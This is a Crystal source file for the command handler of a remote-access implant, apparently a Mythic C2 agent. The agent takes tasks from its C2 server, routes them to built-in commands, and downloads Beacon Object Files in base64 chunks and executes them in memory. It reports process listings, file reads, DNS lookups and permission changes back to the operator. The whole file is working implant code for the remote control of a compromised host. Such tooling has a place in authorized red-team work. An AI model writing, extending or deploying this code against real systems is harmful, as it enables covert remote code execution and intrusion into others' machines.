require "json"
require "base64"
require "../elf/registry"
require "./message_handler"
require "./socks_handler"
require "./commands/*"

module Dark::Agent

  # CommandHandler processes commands from the C2 server and routes them
  # to built-in commands or BOF execution as appropriate. This class:
  # - Manages the BOF registry for loaded BOFs
  # - Routes built-in commands through the command registry system
  # - Handles direct BOF execution with special response formatting
  # - Processes results and formats responses via MessageHandler
  class CommandHandler
    # Singleton instance
    @@instance : CommandHandler?

    def self.instance : CommandHandler?
      @@instance
    end

    # =========================================================
    # Type Definitions & Instance Variables
    # =========================================================

    # BOF registry for managing loaded BOFs
    getter bof_registry : Dark::ELF::BofRegistry
    # Command registry for built-in commands (modular command system)
    @registry : Commands::Registry
    # Configuration instance
    getter config : Config::Base

    # =========================================================
    # Initialization & Command Registration
    # =========================================================

    def initialize(config : Config::Base)
      # Store the config instance
      @config = config

      # Initialize registries
      @registry = Commands::Registry.new
      @bof_registry = Dark::ELF::BofRegistry.new

      # Set instance
      @@instance = self

      # Set up commands
      register_all_commands

      # Set up function callbacks for BOFs
      Dark::ELF::Callbacks.register_defaults

    end

    # Automatically register all built-in commands with the registry
    # Uses Crystal macros to find all classes that inherit from Commands::Base
    # This eliminates the need to manually maintain a registration list
    private def register_all_commands
      {% for klass in Commands::Base.all_subclasses %}
        @registry.register({{klass}})
      {% end %}
    end

    # =====================================================================
    # === FILE OPERATIONS ===
    # =====================================================================
    # Downloads a file from Mythic C2 server in chunks
    # Retrieves binary content by making multiple chunked requests
    # Handles reassembly of chunks and progress tracking
    # Returns file contents as bytes or nil if download failed
    # =====================================================================


    # Downloads a BOF file from Mythic C2 server in chunks
    protected def download_bof_file(file_id : String, task_id : String) : Bytes?
      begin
        log_debug("Downloading file_id: #{file_id}")

        chunk_size = @config.chunk_size
        chunk_num = 0
        total_chunks = 1
        file_data = IO::Memory.new

        log_debug("Starting chunked download of file: #{file_id}")

        while chunk_num < total_chunks
          request = {
            "action": "post_response",
            "responses": [
              {
                "upload": {
                  "chunk_size": chunk_size,
                  "file_id": file_id,
                  "chunk_num": chunk_num + 1
                },
                "task_id": task_id
              }
            ]
          }

          response_json = Dark::Agent::Transport::Active.instance.send_and_receive(request.to_json)
          response = JSON.parse(response_json)

          if response["responses"]? && response["responses"].as_a.size > 0
            chunk = response["responses"][0]

            if chunk["chunk_data"]?
              chunk_data = Base64.decode(chunk["chunk_data"].as_s)
              file_data.write(chunk_data)

              chunk_num += 1
              total_chunks = chunk["total_chunks"].as_i

              log_warn("Downloaded chunk #{chunk_num}/#{total_chunks} (#{chunk_data.size} bytes)")
            else
              log_error("Missing chunk data in response")
              return nil
            end
          else
            log_error("Invalid response format")
            return nil
          end
        end

        log_warn("Completed download: #{file_data.size} bytes")
        return file_data.to_slice
      rescue ex
        log_error("Error downloading file: #{ex.message}")
        return nil
      end
    end


    # =====================================================================
    # === COMMAND EXECUTION & ROUTING ===
    # =====================================================================
    # This section contains the core command routing functionality:
    # - execute: Main entry point for command processing
    # - Routes to command registry for built-in commands
    # - Routes to BOF registry for loaded BOF execution
    # =====================================================================

    # Parses and normalizes task parameters from JSON string format
    # If parameters are provided as a JSON string, they are parsed and embedded into the task
    # Returns the task with parsed parameters or the original task if parsing fails
    private def parse_task_parameters(task : JSON::Any) : JSON::Any
      return task unless task["parameters"]?.try(&.as_s?)

      parameters_json = task["parameters"].as_s
      if parameters_json.empty?
        # Set empty parameters to empty JSON object instead of empty string
        task_hash = task.as_h
        task_hash["parameters"] = JSON.parse("{}")
        return JSON::Any.new(task_hash)
      end

      parsed_parameters = JSON.parse(parameters_json)
      task_hash = task.as_h
      task_hash["parameters"] = parsed_parameters
      JSON::Any.new(task_hash)
    rescue ex
      log_error("Failed to parse parameters JSON: #{ex.message}")
      task
    end

    # Executes built-in commands through the registry system
    # Returns true if the command was found and executed, false otherwise
    private def execute_builtin_command(command : String, task : JSON::Any) : Bool
      return false unless @registry.has_command?(command)

      log_warn("Executing built-in command: #{command}")
      @registry.execute(command, task)
      true
    end


    # Main command execution entry point
    #
    # The execute method is the central command routing function that:
    # 1. Parses the JSON task input from the C2 server
    # 2. Identifies the requested command
    # 3. Routes to command registry for built-in commands (sleep, load, download, etc.)
    # 4. Routes to BOF registry for loaded BOF execution with special response handling
    # 5. Handles errors and queues responses via MessageHandler
    #
    # @param task_json [String] The JSON string containing the task details
    # @return [Nil] Responses are queued through MessageHandler

    def execute(task_json : String)
      return nil if task_json.empty? || task_json == "{}"

      begin
        task = JSON.parse(task_json)
        log_debug "Task: #{task.inspect}"

        # Extract task_id if present for regular tasks
        task_id = task["id"].try(&.as_s?)
        raise "Unknown Task ID" if task_id.nil?

        if task["command"]?
          command = task["command"].try(&.as_s)

          # Parse parameters if provided as a JSON string
          task = parse_task_parameters(task)
          log_debug("Task with parameters: #{task}")

          # Route to built-in command via registry system
          return if execute_builtin_command(command, task)

          # Route to BOF execution for loaded BOFs
          if @bof_registry.bofs.has_key?(command)
            log_debug("Executing BOF command: #{command}")
            execute_bof_command(command, task, task_id)
            return
          end

          # Unknown command - queue error response
          log_debug("Unknown command: #{command}")
          MessageHandler.add_response(task_id, :error, "Unknown command: #{command}")
        end
      rescue ex
        # This try/catch is for the top-level execute method only
        # Individual commands have their own error handling via registry
        log_debug("Error executing task: #{ex.message}")

        # Queue error response
        MessageHandler.add_response(task_id || "", :error, "Error: #{ex.message}")
      end
    end



    # =====================================================================
    # === BOF EXECUTION & UTILITIES ===
    # =====================================================================

    # Executes a loaded BOF with argument parsing and special response handling
    # Some BOFs (like ps) require custom response formatting for Mythic UI
    private def execute_bof_command(command : String, task : JSON::Any, task_id : String)
      # Parse BOF arguments - supports both single string and split args
      if task["parameters"]? && (bof_args_str = task["parameters"]["bof_args_str"]?.try(&.as_s))
        args = bof_args_str.empty? ? [] of String : [bof_args_str]
      else
        args = task["parameters"]? ? task["parameters"]["bof_args"]?.try(&.as_s.split) || [] of String : [] of String
      end

      # Execute the BOF
      log_warn("Executing BOF command: #{command}")
      result = @bof_registry.execute(command, args, task_id: task_id)

      # Get the captured output from BOF execution
      output = Dark::ELF::Callbacks.get_and_clear_output
      
      # Check if BOF returned JSON with success/failure status
      bof_success = true
      error_message = ""
      
      begin
        # Try to parse output as JSON to check for success field
        if !output.empty?
          parsed_output = JSON.parse(output)
          if success_field = parsed_output["success"]?
            bof_success = success_field.as_bool
            # Extract error message if available
            if !bof_success
              error_message = (parsed_output["error"]? || parsed_output["message"]?).try(&.as_s) || ""
            end
          end
        end
      rescue ex
        # Not JSON or parsing failed - treat as success (backward compatibility)
        log_debug("BOF output not JSON or parsing failed: #{ex.message}")
      end

      # Send error response if BOF failed
      if !bof_success
        error_msg = error_message.empty? ? "BOF execution failed" : error_message
        MessageHandler.add_response(task_id, :error, error_msg)
        return
      end

      # Handle special BOF response formats for successful executions
      case command
      when "ps"
        log_debug "ps BOF raw output (#{output.bytesize} bytes): #{output[0, [output.bytesize, 512].min].inspect}"
        processes_hash = parse_ps_json_output(output)
        MessageHandler.add_response(task_id, :process_browser, processes: processes_hash, user_output: "Process list retrieved from BOF")
      when "cat"
        MessageHandler.add_response(task_id, :artifact, base_artifact: "File Read", artifact: args[0], needs_cleanup: false)
        MessageHandler.add_response(task_id, :success, output)
      when "nslookup"
        MessageHandler.add_response(task_id, :artifact, base_artifact: "DNS Query", artifact: args[0], needs_cleanup: false)
        MessageHandler.add_response(task_id, :success, output)
      when "chmod"
        MessageHandler.add_response(task_id, :artifact, base_artifact: "File Permission Change", artifact: args[1], needs_cleanup: false)
        MessageHandler.add_response(task_id, :success, output)
      when "chown"
        MessageHandler.add_response(task_id, :artifact, base_artifact: "File Ownership Change", artifact: args[1], needs_cleanup: false)
        MessageHandler.add_response(task_id, :success, output)
      else
        # Standard BOF output
        MessageHandler.add_response(task_id, :success, output)
      end
    end

    # Parses JSON output from ps BOF for process browser display
    # The ps BOF outputs JSON in the format: {"processes": [...]}
    # This method extracts the processes array for Mythic's process browser
    private def parse_ps_json_output(json_output : String) : JSON::Any
      begin
        parsed = JSON.parse(json_output)

        # BOF outputs {"processes": [...]} format
        if processes_data = parsed["processes"]?
          return processes_data
        else
          log_debug("No 'processes' key found in JSON output")
          return JSON::Any.new([] of JSON::Any)
        end
      rescue ex
        log_debug("Error parsing JSON output: #{ex.message}")
        return JSON::Any.new([] of JSON::Any)
      end
    end
  end
end